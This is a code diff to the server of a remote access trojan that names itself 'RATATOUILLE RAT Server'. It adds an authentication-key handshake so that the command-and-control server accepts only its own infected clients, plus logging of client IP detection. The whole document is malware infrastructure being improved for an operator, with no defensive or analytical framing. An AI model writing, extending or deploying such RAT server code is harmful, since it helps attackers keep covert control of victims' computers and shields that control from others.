@@ -22,6 +22,9 @@ from modules.server_ui_utils import print_banner, print_prompt, show_main_menu, 
 # Initialize colorama
 colorama.init(autoreset=True)
 
+# Global authentication key - will be set by user
+AUTH_KEY = None
+
 def parse_arguments():
     """Parse command line arguments for server configuration"""
     parser = argparse.ArgumentParser(description='RATATOUILLE RAT Server')
@@ -239,7 +242,42 @@ def accept_connections(server_socket):
         try:
             client, addr = server_socket.accept()
 
-            # Find an empty slot for the new client
+            # Validate this is actually our RAT client before accepting
+            try:
+                client.settimeout(5.0)  # 5 second timeout for validation
+                client.send("validate_client".encode())
+                validation_response = client.recv(1024).decode('utf-8', errors='replace')
+                client.settimeout(None)  # Reset timeout
+                
+                # Check if this is our RAT client and validate authentication key
+                if "RAT_CLIENT_VALIDATED" not in validation_response:
+                    print(f"❌ Invalid client connection from {addr[0]}:{addr[1]} - not our RAT client")
+                    client.close()
+                    continue
+                
+                # Extract and validate authentication key
+                if ":" in validation_response:
+                    client_key = validation_response.split(":", 1)[1]
+                    if AUTH_KEY is None:
+                        print(f"❌ Server authentication key not set! Use 'Set Auth Key' option first.")
+                        client.close()
+                        continue
+                    elif client_key != AUTH_KEY:
+                        print(f"❌ Authentication failed from {addr[0]}:{addr[1]} - invalid key: '{client_key}'")
+                        client.close()
+                        continue
+                    else:
+                        print(f"✅ Client authenticated successfully from {addr[0]}:{addr[1]} with key: '{client_key}'")
+                else:
+                    print(f"❌ No authentication key provided by client from {addr[0]}:{addr[1]}")
+                    client.close()
+                    continue
+            except Exception as e:
+                print(f"❌ Failed to validate client from {addr[0]}:{addr[1]} - {str(e)}")
+                client.close()
+                continue
+            
+            # Find an empty slot for the validated client
             for i in range(MAX_CLIENTS):
                 if client_sockets[i] is None:
                     client_sockets[i] = client
@@ -294,6 +332,7 @@ def accept_connections(server_socket):
                                     client_info[client_id]['ip_detection_status'] = 'failed'
                         except Exception as e:
                             # Mark as failed but keep connection
+                            print(f"⚠️  IP detection failed for client {client_id}: {str(e)}")
                             if client_info[client_id] is not None:
                                 client_info[client_id]['ip_detection_status'] = 'failed'
                     
